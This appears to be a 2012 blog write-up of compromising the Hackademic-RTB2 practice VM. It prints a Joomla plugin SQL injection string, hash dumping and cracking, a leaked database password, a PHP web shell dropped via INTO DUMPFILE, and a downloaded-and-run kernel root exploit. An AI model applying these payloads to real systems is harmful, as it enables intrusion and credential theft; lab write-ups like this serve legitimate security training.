@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>Solving Hackademic-RTB2</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+
+	<div style="float: right;"></div><br>
+	<p>
+	<nav>
+			<a href="/"><b>post</b></a>.
+			
+			
+			<a href="/other/"><b>other</b></a>.
+			
+			<a href="/about/"><b>about</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>Solving Hackademic-RTB2</h1>
+			<b><time>2012-11-18</time></b>
+		       
+
+			<div>
+				<p>Here&rsquo;s the second distro from mr. pr0n&rsquo;s realistic pentest discs.  This one was quite fun as I had almost zero experience with Joomla front ends, which so happens to be the entry point on this disc.  A little disappointed with the finale, but overall impressed with this disc.  With that, the iconic nmap:</p>
+<pre tabindex="0"><code># Nmap 6.01 scan initiated Wed Nov 14 16:45:09 2012 as: nmap -sS -p- -T5 -A -oN r2.scan 192.168.1.75
+Nmap scan report for 192.168.1.75
+Host is up (0.00016s latency).
+Not shown: 65533 closed ports
+PORT    STATE    SERVICE VERSION
+80/tcp  open     http    Apache httpd 2.2.14 ((Ubuntu))
+|_http-title: Hackademic.RTB2
+|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
+666/tcp filtered doom
+MAC Address: 08:00:27:E5:D1:B9 (Cadmus Computer Systems)
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:kernel:2.6
+OS details: Linux 2.6.17 - 2.6.36, Linux 2.6.19 - 2.6.35
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.16 ms 192.168.1.75
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+# Nmap done at Wed Nov 14 16:45:22 2012 -- 1 IP address (1 host up) scanned in 13.36 seconds
+</code></pre><p>Much like the first one, we&rsquo;ve essentially just got an HTTP server.  Port 666 is tagged as Doom, but its likely there&rsquo;s something else on there.</p>
+<figure><img src="/images/posts/2012/hrt2_1.jpg"/>
+</figure>
+
+<p>There&rsquo;s the main page.  Doesn&rsquo;t look to be hosted on a web platform, and it doesn&rsquo;t appear to be vulnerable to any SQLi.  Running a few queries&hellip;</p>
+<pre tabindex="0"><code>root@bt:/pentest/web/nikto# perl nikto.pl -host http://192.168.1.75
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.75
++ Target Hostname:    192.168.1.75
++ Target Port:        80
++ Start Time:         2012-11-15 18:41:46 (GMT-6)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.14 (Ubuntu)
++ Retrieved x-powered-by header: PHP/5.3.2-1ubuntu4.7
++ Apache/2.2.14 appears to be outdated (current is at least Apache/2.2.19). Apache 1.3.42 (final release) and 2.0.64 are also current.
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ OSVDB-12184: /index.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpmyadmin/: phpMyAdmin directory found
++ 6474 items checked: 0 error(s) and 8 item(s) reported on remote host
++ End Time:           2012-11-15 18:42:00 (GMT-6) (14 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+root@bt:/pentest/web/nikto# 
+</code></pre><figure><img src="/images/posts/2012/hrt2_2.jpg"/>
+</figure>
+
+<p>There appears to be a phpMyAdmin not locked down, but it doesn&rsquo;t appear to be vulnerable to anything right off the bat.  Checking that 666 port again, connecting with netcat seems to dump out a bunch of HTML.  Weird; connecting now&hellip;</p>
+<figure><img src="/images/posts/2012/hrt2_3.jpg"/>
+</figure>
+
+<p>It appears that port 666 has some form of port knocking or filtering enabled.  It also appears to be hosted on Joomla 1.5.  <a href="http://cxsecurity.com/issue/WLB-2008080155">There&rsquo;s</a> an interesting SQLi for early 1.5 builds, but alas this one is already patched.  This is the part where I had to do a lot of googling; I&rsquo;ve only ever made cosmetic modifications to Joomla sites.  The gist of evaluating a Joomla box is enumeration of plugins/modules and platform vulnerabilities.  Plugins are typically found at <a href="http://site.com/index.php?option=com_MODULE">http://site.com/index.php?option=com_MODULE</a>.  From there it&rsquo;s sqlmapping, exploit-db&rsquo;ing (when it&rsquo;s available&hellip;), and googling.  Fortunately I stumbled upon a tool that tossed a lot of this toil into a simple package; NBS 0.3 Joomla Addon Attack Tool.  This came prepackaged with vulnerable plugin lists that evaluated their existence on the box as well as whether they were vulnerable or not.  The tool required a bit of tweaking on my part to account for the non-default port, but otherwise it worked well:</p>
+<pre tabindex="0"><code>-=[ NBS 0.3 - Joomla Addon Attack Tool ]=-
+
+
+Make sure you write &#39;Yes&#39; or &#39;No&#39; without apostrophes.
+Do you wish to scan for addons? Yes or No: Yes
+
+-= Joomla Addon Vulnerability Scanner =-
+
+Example: http://www.domain.tld
+[-] Enter a target to scan: http://192.168.1.75
+[-] Enter the target port [80]: 666
+[*] Trying: index.php?option=com_jscalendar&amp;view=jscalendar&amp;task=details&amp;ev_id= 
+[*] Trying: index.php?option=com_jedirectory&amp;view=item&amp;catid= 
+[*] Trying: index.php?option=com_jejob&amp;view=item_detail&amp;itemid= 
+[*] Trying: index.php?option=com_elite_experts&amp;task=showExpertProfileDetailed&amp;getExpertsFromCountry=&amp;language=ru&amp;id= 
+[*] Trying: index.php?option=com_ezautos&amp;Itemid=49&amp;id=1&amp;task=helpers&amp;firstCode= 
+[*] Trying: index.php?option=com_timetrack&amp;view=timetrack&amp;ct_id= 
+[*] Trying: index.php?option=com_jgen&amp;task=view&amp;id= 
+[*] Trying: index.php?option=com_zoomportfolio&amp;view=portfolio&amp;view=portfolio&amp;id= 
+[*] Trying: index.php?option=com_fabrik&amp;view=table&amp;tableid= 
+[*] Trying: index.php?option=com_zina&amp;view=zina&amp;Itemid= 
+[*] Trying: index.php?option=com_ongallery&amp;task=ft&amp;id= 
+[*] Trying: index.php?option=com_equipment&amp;view=details&amp;id= 
+[*] Trying: index.php?option=com_amblog&amp;view=amblog&amp;catid= 
+[*] Addon Found: index.php?option=com_amblog&amp;view=amblog&amp;catid= 
+[+] This addon appears to be vulnerable!
+[+] Exploited with  index.php?option=com_amblog&amp;view=amblog&amp;catid=
+[+] Full exploit string: /index.php?option=com_amblog&amp;view=amblog&amp;catid=-1+UNION+SELECT+load_file(&#39;/etc/passwd&#39;)
+root@bt:~/hackademicr2/nbs03#
+</code></pre><p>Just like that I knew the vulnerable plugin and the query string to exploit it.  This dumps:</p>
+<pre tabindex="0"><code>root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh syslog:x:101:103::/home/syslog:/bin/false messagebus:x:102:107::/var/run/dbus:/bin/false avahi-autoipd:x:103:110:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false avahi:x:104:111:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false couchdb:x:105:113:CouchDB Administrator,,,:/var/lib/couchdb:/bin/bash speech-dispatcher:x:106:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh usbmux:x:107:46:usbmux daemon,,,:/home/usbmux:/bin/false haldaemon:x:108:114:Hardware abstraction layer,,,:/var/run/hald:/bin/false kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false pulse:x:110:115:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit:x:111:117:RealtimeKit,,,:/proc:/bin/false saned:x:112:118::/home/saned:/bin/false hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false gdm:x:114:120:Gnome Display Manager:/var/lib/gdm:/bin/false p0wnbox:x:1000:1000:p0wnbox,,,:/home/p0wnbox:/bin/bash mysql:x:115:123:MySQL Server,,,:/var/lib/mysql:/bin/false 
+</code></pre><p>Playing around with sqlsus, we find:</p>
+<pre tabindex="0"><code>root@bt:/pentest/database/sqlsus# ./sqlsus hackr2.conf 
+
+              sqlsus version 0.7.2
+
+  Copyright (c) 2008-2011 Jérémy Ruffet (sativouf)
+
+[+] Session &#34;192.168.1.75&#34; created
+sqlsus&gt; start
+[+] Correct number of columns for UNION : 1 (1)
+[+] Length restriction on URL : 8200 bytes                      
+[+] Filling %target...
++----------+--------------------+
+| Variable | Value              |
++----------+--------------------+
+| database | joomla             |
+| user     | &#39;root&#39;@&#39;localhost&#39; |
+| version  | 5.1.41-3ubuntu12.8 |
++----------+--------------------+
+3 rows in set 
+
+sqlsus&gt; 
+</code></pre><p>And for reference:</p>
+<pre tabindex="0"><code>root@bt:/pentest/database/sqlsus# cat hackr2.conf | grep 192.168.1.75
+our $url_start = &#34;http://192.168.1.75:666/index.php?option=com_amblog&amp;view=amblog&amp;catid=-1&#34;;
+</code></pre><p>Looking up the Joomla 1.5 <a href="http://docs.joomla.org/Detailed_list_of_fields">database schema</a>, we find the users can be found in jos_users:</p>
+<pre tabindex="0"><code>sqlsus&gt; get columns jos_users
+[+] Getting columns names for joomla.jos_users
++----------------------+                                              
+| Columns in jos_users |
++----------------------+
+| id                   |
+| name                 |
+| username             |
+| email                |
+| password             |
+| usertype             |
+| block                |
+| sendemail            |
+| gid                  |
+| registerdate         |
+| lastvisitdate        |
+| activation           |
+| params               |
++----------------------+
+13 rows in set 
+
+sqlsus&gt; select id,username,password,usertype from jos_users
++----+---------------+-------------------------------------------------------------------+---------------------+
+| id | username      | password                                                          | usertype            |
++----+---------------+-------------------------------------------------------------------+---------------------+
+| 62 | Administrator | 08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl | Super Administrator |
+| 63 | JSmith        | 992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF | Registered          |
+| 64 | BTallor       | abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy | Registered          |
++----+---------------+-------------------------------------------------------------------+---------------------+
+3 rows in set (2 hits)
+
+sqlsus&gt; 
+</code></pre><p>These passwords are stored as md5(password + salt), so we need to load them up into Hashcat or john and let them run around.  As a note, I modified the hashes a bit to be in the form <code>username:md5$salt</code></p>
+<pre tabindex="0"><code>root@bt:/pentest/passwords/john# john --wordlist=/pentest/passwords/wordlists/rockyou.txt --form=dynamic_1 /root/hackademicr2/hashes.txt 
+Loaded 3 password hashes with 3 different salts (dynamic_1: md5($p.$s) (joomla) [128/128 SSE2 intrinsics 32x4x1])
+Remaining 1 password hash
+guesses: 0  time: 0:00:00:03 DONE (Thu Nov 15 23:03:45 2012)  c/s: 4333K  trying:   b1tch3s   -  * 7¡Vamos! 
+root@bt:/pentest/passwords/john# cat john.pot
+$dynamic_1$992396d7fc19fd76393f359cb294e300$70NFLkBrApLamH9VNGjlViJLlJsB60KF:matrix
+$dynamic_1$abe1ae513c16f2a021329cc109071705$FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy:victim
+root@bt:/pentest/passwords/john# 
+</code></pre><p>Well we got the two users, but no super admin.</p>
+<p>I handed the hash off for further cracking elsewhere, but lets again take a look at the results dirbuster turned up:</p>
+<figure><img src="/images/posts/2012/hrt2_4.jpg"/>
+</figure>
+
+<p>After more digging through Joomla documentation, turns out the &lsquo;configuration.php&rsquo; holds, surprise, Joomla site configurations, specifically..</p>
+<pre tabindex="0"><code>root@bt:/pentest/database/sqlmap# python sqlmap.py --url &#34;http://192.168.1.75:666/index.php?option=com_amblog&amp;view=amblog&amp;catid=-1&#34; -p &#39;catid&#39; --dbms mysql --file-read=&#34;/var/www/configuration.php&#34;
+[SNIP]
+root@bt:/pentest/database/sqlmap# cat output/192.168.1.75/files/_var_www_configuration.php 
+&lt;?php
+class JConfig {
+/* Site Settings */
+var $offline = &#39;0&#39;;
+var $offline_message = &#39;This site is down for maintenance.&lt;br /&gt; Please check back again soon.&#39;;
+var $sitename = &#39;Hackademic.RTB2&#39;;
+var $editor = &#39;tinymce&#39;;
+var $list_limit = &#39;20&#39;;
+var $legacy = &#39;0&#39;;
+/* Debug Settings */
+var $debug = &#39;0&#39;;
+var $debug_lang = &#39;0&#39;;
+/* Database Settings */
+var $dbtype = &#39;mysql&#39;;
+var $host = &#39;localhost&#39;;
+var $user = &#39;root&#39;;
+var $password = &#39;yUtJklM97W&#39;;
+var $db = &#39;joomla&#39;;
+var $dbprefix = &#39;jos_&#39;;
+/* Server Settings */
+var $live_site = &#39;&#39;;
+var $secret = &#39;iFzlVUCg9BBPoUDU&#39;;
+var $gzip = &#39;0&#39;;
+var $error_reporting = &#39;-1&#39;;
+var $helpurl = &#39;http://help.joomla.org&#39;;
+var $xmlrpc_server = &#39;0&#39;;
+var $ftp_host = &#39;127.0.0.1&#39;;
+var $ftp_port = &#39;21&#39;;
+var $ftp_user = &#39;&#39;;
+var $ftp_pass = &#39;&#39;;
+var $ftp_root = &#39;&#39;;
+var $ftp_enable = &#39;0&#39;;
+var $force_ssl = &#39;0&#39;;
+[SNIP]
+</code></pre><p>Huzzah, root password hardcoded into the configuration file.  Note that this is only the MySQL root password, although its entirely possible that its also the system root password.  We know that there exists a phpMyAdmin listener, so lets log into that with our newfound credentials:</p>
+<figure><img src="/images/posts/2012/hrt2_5.jpg"/>
+</figure>
+
+<p>Now we&rsquo;ve got root on the database and access to the phpMyAdmin console.  From here, we can inject a backdoor that allows us to execute commands on the backend system.  This method was taken from <a href="http://www.securitytube.net/video/937">here</a>, though it&rsquo;s not exactly new.</p>
+<p>First we create a new table:</p>
+<pre tabindex="0"><code>CREATE TABLE shell(
+ Sauce TEXT
+) ENGINE = MYISaM;
+</code></pre><p>Here we&rsquo;re creating a new table, shell, with a single text field, Sauce, as a MYISaM container (<a href="http://dev.mysql.com/doc/refman/5.0/en/myisam-storage-engine.html">more here</a>).  Next we&rsquo;ll insert the actual shell interpreter into the table:</p>
+<pre tabindex="0"><code>INSERT INTO shell
+VALUES(
+&#39;&lt;pre&gt;&lt;? @system($_REQUEST[&#34;v&#34;]); ?&gt;&lt;/pre&gt;&#39;
+);
+</code></pre><p>Next we&rsquo;re going to need to dump to a php file for us to actually run with.  This can be done with the INTO DUMPFILE sql command, like so:</p>
+<pre tabindex="0"><code>SELECT *
+INTO DUMPFILE &#39;/var/www/st.php&#39;
+FROM shell;
+</code></pre><p>How do we know to hit /var/www?  By pulling the default apache2 config file of course:</p>
+<pre tabindex="0"><code>root@bt:/pentest/database/sqlmap# python sqlmap.py --url &#34;http://192.168.1.75:666/index.php?option=com_amblog&amp;view=amblog&amp;catid=-1&#34; -p &#39;catid&#39; --dbms mysql --file-read=&#39;/etc/apache2/sites-available/default&#39;
+root@bt:/pentest/database/sqlmap# cat output/192.168.1.75/files/_etc_apache2_sites-available_default 
+[SNIP]
+&lt;VirtualHost *:666&gt;
+    ServerAdmin webmaster@localhost
+
+    DocumentRoot /var/www
+    &lt;Directory /&gt;
+        Options FollowSymLinks
+        AllowOverride None
+    &lt;/Directory&gt;
+    &lt;Directory /var/www/&gt;
+        Options Indexes FollowSymLinks MultiViews
+        AllowOverride None
+        Order allow,deny
+        allow from all
+    &lt;/Directory&gt;
+
+    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
+    &lt;Directory &#34;/usr/lib/cgi-bin&#34;&gt;
+        AllowOverride None
+        Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
+        Order allow,deny
+        Allow from all
+    &lt;/Directory&gt;
+
+    ErrorLog /var/log/apache2/error.log
+
+    # Possible values include: debug, info, notice, warn, error, crit,
+    # alert, emerg.
+    LogLevel warn
+
+    CustomLog /var/log/apache2/access.log combined
+
+    Alias /doc/ &#34;/usr/share/doc/&#34;
+    &lt;Directory &#34;/usr/share/doc/&#34;&gt;
+        Options Indexes MultiViews FollowSymLinks
+        AllowOverride None
+        Order deny,allow
+        Deny from all
+        Allow from 127.0.0.0/255.0.0.0 ::1/128
+    &lt;/Directory&gt;
+
+&lt;/VirtualHost&gt;
+</code></pre><p>Now we can execute commands on the backend:</p>
+<figure><img src="/images/posts/2012/hrt2_6.jpg"/>
+</figure>
+
+<p>As you can see, most everything in <code>/var/www/</code> is owned by root, which would explain our inability to write anywhere.  The ownership of <code>configuration.php</code> would also explain our ability to retrieve it.</p>
+<p>Another interesting bit was found in user p0wnbox&rsquo;s download&rsquo;s folder.  knockknock-0.7.tar.gz.</p>
+<figure><img src="/images/posts/2012/hrt2_7.jpg"/>
+</figure>
+
+<p>We can&rsquo;t yet read the configuration file (we&rsquo;re www-data), but it appears that a port knocker is running.  This is likely why I couldn&rsquo;t immediately connect to the :666 Joomla site.  Interesting.</p>
+<p>Let&rsquo;s drop a reverse shell onto the box the same way we did the command access.</p>
+<pre tabindex="0"><code>CREATE TABLE bdshell(
+Sauce TEXT
+);
+
+INSERT INTO bdshell
+VALUES(INSERT INTO shell
+VALUES(
+[SNIP]
+);
+
+SELECT *
+INTO DUMPFILE &#39;/var/www/bd.php&#39;
+FROM bdshell;
+</code></pre><p>The snipped area from the insert is just a <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">PHP reverse shell</a>, stripped of all apostrophes.  We can now connect to it like so:</p>
+<figure><img src="/images/posts/2012/hrt2_7.jpg"/>
+</figure>
+
+<p>Now we&rsquo;ve got a shell on the box as www-data.  A little enumeration&hellip;</p>
+<pre tabindex="0"><code>$ whoami
+www-data
+$ uname -a
+Linux HackademicRTB2 2.6.32-24-generic #39-Ubuntu SMP Wed Jul 28 06:07:29 UTC 2010 i686 GNU/Linux
+</code></pre><p>Huzzah,<a href="http://threatpost.com/en_us/blogs/linux-kernel-flaw-coughs-root-rights-102110">privilege</a> escalation time.  Funny enough, exactly the exploit we used for RTB1.</p>
+<pre tabindex="0"><code>$ cd /tmp
+$ ls
+orbit-gdm
+pulse-PKdhtXMmr18n
+$ wget www.vsecurity.com/download/tools/linux-rds-exploit.c
+--2012-11-19 06:01:56--  http://www.vsecurity.com/download/tools/linux-rds-exploit.c
+Resolving www.vsecurity.com... 209.67.252.12
+Connecting to www.vsecurity.com|209.67.252.12|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 6435 (6.3K) [text/x-c]
+Saving to: `linux-rds-exploit.c&#39;
+
+     0K ......                                                100% 83.6K=0.08s
+
+2012-11-19 06:01:56 (83.6 KB/s) - `linux-rds-exploit.c&#39; saved [6435/6435]
+
+$ ls
+linux-rds-exploit.c
+orbit-gdm
+pulse-PKdhtXMmr18n
+$ gcc linux-rds-exploit.c -o sploit
+$ ./sploit
+[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
+[*] by Dan Rosenberg
+[*] Resolving kernel addresses...
+ [+] Resolved rds_proto_ops to 0xe099e980
+ [+] Resolved rds_ioctl to 0xe0998090
+ [+] Resolved commit_creds to 0xc016dd80
+ [+] Resolved prepare_kernel_cred to 0xc016e0c0
+[*] Overwriting function pointer...
+[*] Linux kernel &gt;= 2.6.30 RDS socket exploit
+[*] by Dan Rosenberg
+[*] Resolving kernel addresses...
+ [+] Resolved rds_proto_ops to 0xe099e980
+ [+] Resolved rds_ioctl to 0xe0998090
+ [+] Resolved commit_creds to 0xc016dd80
+ [+] Resolved prepare_kernel_cred to 0xc016e0c0
+[*] Overwriting function pointer...
+[*] Triggering payload...
+[*] Restoring function pointer...
+$ whoami
+root
+$ cd /root
+$ ls
+Desktop
+Key.txt
+</code></pre><p>Bam.  Answering a question I had before,</p>
+<pre tabindex="0"><code>$ cat /etc/knockd.conf
+[options]
+    UseSyslog
+
+[openHTTPD]
+    sequence    = 7000,8000,9000
+    seq_timeout = 5
+    command     = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
+    tcpflags    = syn
+
+[closeHTTPD]
+    sequence    = 9000,8000,7000
+    seq_timeout = 5
+    command     = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 666 -j ACCEPT
+    tcpflags    = syn
+</code></pre><p>So we&rsquo;d need to hit 7000, then 8000, then finally 9000 to get accepted.  Fortunately a simple nmap of the box will enable this rule, so it really isn&rsquo;t a very impressive port knocking tool.</p>
+<p>Overall a fun disc.  And if there&rsquo;s any interest, I may pick up the Joomla attack tool and continue development of it.</p>
+
+			</div>
+		</article>
+	</main>
+<aside>
+	<div>
+		<div>
+			<h3>LATEST POSTS</h3>
+		</div>
+		<div>
+			<ul>
+				
+				<li><a href="/blog/the-fanciful-allure-and-utility-of-syscalls/">the fanciful allure and utility of syscalls</a></li>
+				
+				<li><a href="/blog/on-exploiting-cve-2021-1648-splwow64-lpe/">On Exploiting CVE-2021-1648 (splwow64 LPE)</a></li>
+				
+				<li><a href="/blog/digging-the-adobe-sandbox-ipc-internals/">Digging the Adobe Sandbox - IPC Internals</a></li>
+				
+				<li><a href="/blog/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a></li>
+				
+				<li><a href="/blog/code-execution-via-fiber-local-storage/">Code Execution via Fiber Local Storage</a></li>
+				
+			</ul>
+		</div>
+	</div>
+</aside>
+
+
+	<footer>
+	<p>&copy; 2024 <a href="https://dronesec.pw/"><b>Bryan Alexander</b></a>.
+	</p>
+</footer>
+
+</body>
+</html>
